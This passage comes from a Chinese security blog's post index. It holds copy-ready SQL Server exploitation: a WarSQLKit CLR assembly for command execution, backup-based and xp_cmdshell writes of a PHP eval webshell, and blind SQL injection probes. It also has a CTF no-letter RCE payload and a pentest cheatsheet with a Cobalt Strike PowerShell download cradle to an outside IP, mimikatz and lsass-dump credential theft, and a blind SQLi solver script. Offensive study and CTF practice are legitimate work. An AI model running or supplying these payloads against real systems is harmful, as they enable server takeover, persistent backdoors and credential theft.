07400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;#创建存储过程,单独执行CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;#执行命令EXEC sp_cmdExec 'whoami';#删除该程序集DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit]; ###DB_owner权限LOG备份Getshell无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马####利用前提 目标机器存在数据库备份文件 ，也就是如果我们利用 test 数据库的话，则需要该test数据库存在数据库备份文件，而且恢复模式得是 完整模式 知道网站的绝对路径 支持堆叠注入alter database 数据库名 set RECOVERY FULL; #修改数据库恢复模式为 完整模式create table cmd (a image); #创建一张表cmd，只有一个列 a，类型为imagebackup log 数据库名 to disk= 'C:\\phpstudy\\WWW\\1.php' with init; #备份表到指定路径insert into cmd (a) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e); #插入一句话到cmd表里backup log 数据库名 to disk='C:\\phpstudy\\WWW\\2.php'; #把操作日志备份到指定文件drop table cmd; #删除cmd表 第四行的 0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马 &lt;?php @eval($_POST[x]);?&gt; 的16进制表示 其中2.php才是我们的木马文件 ####DB_owner权限差异备份Getshell 知道绝对路径 支持堆叠注入create table [dbo].[test] ([cmd] [image])declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x786965 backup log @a to disk = @s with init,no_truncateinsert into [test](cmd) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x43003A005C00700068007000730074007500640079005C005700570057005C007300680065006C006C002E00700068007000 backup log @a to disk=@s with init,no_truncateDrop table [test] ###盲注SQLServer数据库 1.判断是否为SQLServer数据库 exists(select * from sysobjects) 2.判断当前数据库用户权限 and 1=(IS_SRVROLEMEMBER('sysadmin')) //返回正常为saand 1=(IS_MEMBER('db_owner')) //返回正常为DB_OWNERand 1=(IS_srvrolemember('public')) //public权限,较低 SA权限时，三个都返回true，DB_OWNER时sa就返回false3.判断xp_cmdshell是否存在 and 1=(Select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') 开启后，如果需要执行命令，则需要堆叠注入###利用堆叠注入获取SQLServer权限 目标网站注入支持堆叠注入 当前权限是SA权限 使用sqlmap的 –os-shell 无法获取到权限利用思路：获取网站绝对路径后写马获取权限利用的查找命令：查找目标机器C盘下的test.txt文件for /r c:\\ %i in (test*.txt) do @echo %i #这里的文件名后缀前那个点一定要加*号dir /s /b c:\\test.txt 利用过程： 1.已知目标网站下有一个test.txt文件 创建表hack，并添加一个tmp的字段create table hack (tmp varchar(1000));-- 查找网站绝对路径，并将其写入表中以供查询 2.查找目标机器C盘下的test.txt路径，并将结果写入刚刚创建的hack表的tmp字段;insert into hack(tmp) exec master..xp_cmdshell 'dir /s /b c:\\test.txt';--或;insert into hack(tmp) exec master..xp_cmdshell 'for /r c:\\ %i in (test*.txt) do @echo %i' 3.将木马写入网站根目录，需要注意的是&lt;&gt;前面都需要加上^ 1;exec master..xp_cmdshell 'echo ^&lt;?php @eval($_POST[x]);?^&gt; &gt; C:\\phpstudy\\www\\shell.php';--","link":"/2022/12/20/sql_server%E6%B3%A8%E5%85%A5/"},{"title":"代码审计小记","text":"##可访问文件收集如果存在反序列化，这里可以直接利用.//wp-content/plugins/product-import-export-for-woo/admin/modules/product_tags/import/import.php:272 : 读取文件函数中存在变量，可能存在任意文件读取漏洞 如果可以覆盖文件写入的话.//wp-content/plugins/woocommerce-germanized/vendor/globalcitizen/php-iban/php-iban.php:607 : 读取文件函数中存在变量，可能存在任意文件读取漏洞","link":"/2022/08/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"title":"使用frp进行流量转发","text":"为什么使用FRP通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括： 客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。 采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。 代理组间的负载均衡。 端口复用，多个服务通过同一个服务端端口暴露。 多个原生支持的客户端插件(静态文件查看，HTTP、SOCK5 代理等)，便于独立使用 frp 客户端完成某些工作。 高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。 服务端和客户端 UI 页面。 FRP实现原理frp 主要由客户端(frpc)和服务端(frps)组成，服务端通常部署在具有公网 IP 的机器上，客户端通常部署在需要穿透的内网服务所在的机器上内网没有公网ip，所以使用公网服务器搭载frp，内网反连公网frp，其他人需要访问内网的发起请求时，通过frp的代理到达内网 过程1.frps frp 服务端的配置 [common]server_port = 7000 2.frpc frp客户端，也就是你要访问的机器 配置： server_addr是服务端的ip，server_port是服务端开放的端口，token就是token，到时候配置的代理，ip是服务器的ip，端口走的是7004，也就是remote_port [common]server_addr = 192.168.137.182server_port = 7000token = 9283eae321dtls_enable=true [socks5]type = tcplocal_ip = 127.0.0.1remote_port = 7004plugin = socks5 指令： frpc -c frpc_full.inifrps -c frps.ini","link":"/2022/07/05/%E4%BD%BF%E7%94%A8frp%E8%BF%9B%E8%A1%8C%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/"},{"title":"基于fabric的区块链项目","text":"#搭建fabric环境##配置证书fabric网络中节点之间通讯都需要提供证书用来标识自己的身份cryptogen工具快速生成相关证书##配置系统链创世块fabric系统配置是存放在区块链上的，系统成功运行至少要有一个链configtxgen生成系统链，第一个数据块保存了用户定义的一些配置， 会读取configtx.yaml和crypto-config文件下的证书用于生成channel的创世块生成的 genesis.block 是系统链的第一个区块，里面存放了 Orderer 节点、Orderer 管理员的证书，在 Orderer 节点启动时会用到这个数据块。##如何理解fabric类似于一个服务器，然后，fabric用go语言实现链码，实现对peer节点的操作，也即是智能合约。###链码一共有五个节点，分为农户【farmer】，原料厂商【material】，生产厂商【productinfo+productProcess】，物流厂商【driver】，零售商【retailer】####物流厂商定义上链的信息结构体通过api接口使用各函数其他的链码定义方式同上####路由定义各个节点的路由####api代码引入fabric-client模块，基于此模块进行fabric区块链网络的节点功能调用通过定义多个路由，利用以下代码进行区块链的上链查询等操作 在区块链环境中，每个希望于网络交互的参与者都需要一个身份，ca提供可验证的数字身份","link":"/2022/12/17/%E5%9F%BA%E4%BA%8Efabric%E7%9A%84%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE/"},{"title":"区块链服务器搭建小记","text":"","link":"/2022/03/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/"},{"title":"无字符rce小记","text":"##利用自增 $_=_(a/a)[_];//N$a=++$_;//O$$a[$a=_.++$_.$a[$_++/$_++].++$_.++$_]($$a[_]); payload ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa","link":"/2022/10/12/%E6%97%A0%E5%AD%97%E7%AC%A6rce/"},{"title":"渗透工具备忘录","text":"webshell工具冰蝎冰蝎的连接较为简单：输入url和密码以后选择脚本类型即可上线 哥斯拉哥斯拉马生成管理——&gt;生成——&gt;生成对应的马并选择有效载荷和加密器 哥斯拉马连接：这里需要注意的是要记得配置代理，否则会链接失败，并且加密器要和刚才的对应 CS将CS上传至公网服务器，执行一下就可以启动，接下来将此IP以及密码填入即可，然后端口是50050 获取beacon创建listener点击cobalt strike——&gt;listeners——&gt;Add（这里的端口需要设置成服务器上未使用的端口） web Delivery 执行payload选择scripted web delivery，然后生成payload 接下来进行launch即可 powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://110.42.xxxx:8888/a'))&quot; 然后右键单击进行interact即可执行命令 tmux快捷键操作发现tmux大家介绍的不错，所以想尝试一下，但发现无论ctrl+a，还是ctrl+b都不好使，经过一番努力后才发现应该是ctrl+b松开后再按其他键。例如ctrl+b ？，应该先同时按ctrl+b 松开后，shift+/（即输入？）。 # 查看有所有tmux会话指 令：tmux ls快捷键：Ctrl+b s# 新建tmux窗口指 令：tmux new -s &lt;session-name&gt;# 重命名会话指 令：tmux rename-session -t &lt;old-name&gt; &lt;new-name&gt;快捷键：Ctrl+b $# 分离会话指 令：tmux detach 或者使用 exit(关闭窗口)快捷键：Ctrl+b d# 重新连接会话指 令：tmux attach -t &lt;session-name&gt; 或者使用 tmux at -t &lt;session-name&gt;#平铺当前窗格（个人很喜欢的快捷键，注意：平铺的是当前选中的窗格）快捷键：Ctrl+b z (再次 Ctrl+b z 则恢复)# 杀死会话指 令：tmux kill-session -t &lt;session-name&gt;# 切换会话指 令：tmux switch -t &lt;session-name&gt;# 划分上下两个窗格指 令：tmux split快捷键：Ctrl+b “# 划分左右两个窗格指 令：tmux split -h快捷键：Ctrl+b %# 光标切换到上方窗格指 令：tmux select-pane -U快捷键：Ctrl+b 方向键上# 光标切换到下方窗格指 令：tmux select-pane -D快捷键：Ctrl+b 方向键下# 光标切换到左边窗格指 令：tmux select-pane -L快捷键：Ctrl+b 方向键左# 光标切换到右边窗格指 令：tmux select-pane -R快捷键：Ctrl+b 方向键右 https://blog.csdn.net/svap1/article/details/39694713 frp代理配置首先配置一下服务器的代理，删除frpc 和 frpc.ini，编辑frps.ini frpc.ini配置，如果换了vps 改一下ip即可 命令 ./frps -c frps.ini #启用服务端frp mimikatz注意：当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。 reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f windows2003使用管理员身份运行 #提升权限privilege::debug#抓取密码sekurlsa::logonpasswords 当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。 cmd修改注册表命令： Copyreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#重启或用户重新登录后可以成功抓取 mimikatz # logmimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords 获取高版本windows系统的密码凭证(procdump导出)使用procdump将lsass dump下来（需要管理员权限） procdump.exe -accepteula -ma lsass.exe 1.dmp 将lsass.dmp下载到本地后，然后执行mimikatz: Copymimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit 为了方便复制与查看，可以输出到本地文件里面： Copymimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &gt; pssword.txt crackmap","link":"/2022/04/18/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%A4%87%E5%BF%98%E5%BD%95-shell%E5%B7%A5%E5%85%B7%E7%AF%87/"},{"title":"渗透测试备忘录—信息搜集","text":"基本架构 ASP+ACCESS + II5.0/6.0+Windows server 2003 ASPX+Mssql+iis 7.0/7.5+ Windows server 2008 PHP+MYSQL+IIS PHP+MYSQL+Apache PHP+MYSQL+IIS JSP+MYSQL+Nginx JSP+Mssql+Tomcat Jsp+oracle+Tomcat 域环境判断1. 查看网关IP地址、Dns的IP地址、域名、本机是否和DNS服务器处于同一网段 ipconfig /all 然后过反向解析查询命令nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上 2.查看系统详细信息 systeminfo 域如果为WORKGROUP，则表示服务器不在域内。 3.查询当前登录域及登录用户信息 “工作站域DNS名称”如果为WORKGROUP，则表示为非预环境，”登录域“用于表示当前登录的用户是域用户还是本地用户 net config workstation 4.判断主域 net time /domain 拒绝访问——&gt;存在域，当前用户不是域用户 命令成功完成——&gt;存在域，且当前用户是域用户 工作组——&gt;找不到域","link":"/2022/04/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"title":"2022虎符","text":"babysql比赛的时候一开始没发现过滤了空格，所以一直出不了，后来才发现，所以说，对于不确定的正则表达式还是要去实际测试一下才行，然后一看就是要盲注，由于过滤了括号 .replace(/[\\s,()#;*\\-]/g, '').replace(/^.*(?=union|binary).*$/gi, '').toString(); 所以首选肯定是case，接下来就是构造盲注语句了，由于是要用regexp来构造，读一下文档，发现regexp可以直接作为等号来使用，并且无需空格，可直接比对内容，一开始构造的是,问题在于直接这样是会爆出语法错误的，这个时候’1’和case直接需要有东西隔开，当时思维禁锢住了，没想到使用||。。。。傻逼了 or'1'='1'case'1'whenxxxx 构造出来以后可以得到 'a'||case'1'when'1'then'1'else'0'end||'a'; ，接下来就是使用regexp进行盲注，盲注的结果分为两种，一种是状态401，一种是状态500,500是因为报错才会产生的，所以我们就构造一个报错盲注,由于不能使用函数，所以这里可以通过数值之间的大数运算来引起报错 'a'||case'1'when'1'then'1'else~0+~0+'a'end||'a'; 接下来就是完善最重要的regexp的盲注部分了 '||case'1'when`username`regexp'^Db'then'1'else~0+~0+'a'end||'a' limit 1; 但是接下来还需要解决大小写问题，查阅mysql8.0的文档，发现regexp在比对的时候可以设置字符集用来表示规则（也就是可以比对大小写）但是我在本地测试的时候，发现要使用对应数据库的编码形式才可以，看了一下hint，可以发现这个数据库是使用这个编码规则的 COLLATE=utf8mb4_0900_as_cs 所以我们的payload也呼之欲出了,使用 '||case'1'when`username`regexp'a'COLLATE‘utf8mb4_0900_as_cs’then'1'else~0+~0+'a'end||'a 接下来就是写成脚本了 import requestsimport stringurl=&quot;http://110.42.133.120:8080/login&quot;s=requests.session()#a=string.printablea=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!%&amp;'/:&lt;=&gt;@[]^_`{}~^!$&quot;print(a)print(a[-3:])str = &quot;&quot;#aeoofor j in range(0,100): for i in a: if i in a[-3:]: i=i.replace(i,f'\\\\\\\\{i}') payload=f&quot;a'||case'1'when`password`regexp'^{str+i}'COLLATE`utf8mb4_0900_as_cs`then'1'else~0+~0+'a'end||'a&quot; data={ &quot;username&quot;:payload, &quot;password&quot;:&quot;a&quot; } r=s.post(url,data=data).text print(r) print(payload) if &quot;401&quot; in r: if &quot;\\\\&quot; in i: i.replace(&quot;\\\\\\\\&quot;,&quot;&quot;) str+=i print(f&quot;[+]{str}&quot;) break","link":"/2022/03/19/%E8%99%8E%E7%AC%A6/"}],"tags":[{"name":"文件包含","slug":"文件包含","link":"/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"html原理","slug":"html原理","link":"/tags/html%E5%8E%9F%E7%90%86/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"bugku","slug":"bugku","link":"/tags/bugku/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"bugku2","slug":"bugku2","link":"/tags/bugku2/"},{"name":"html","slug":"html","link":"/tags/html/"},{"name":"反弹shell","slug":"反弹shell","link":"/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"typro","slug":"typro","link":"/tags/typro/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"MYSQL","slug":"MYSQL","link":"/tags/MYSQL/"},{"name":"sql注入","slug":"sql注入","link":"/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"sqlmap","slug":"sqlmap","link":"/tags/sqlmap/"},{"name":"xss","slug":"xss","link":"/tags/xss/"},{"name":"渗透测试","slug":"渗透测试","link":"/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"categories":[],"pages":[]}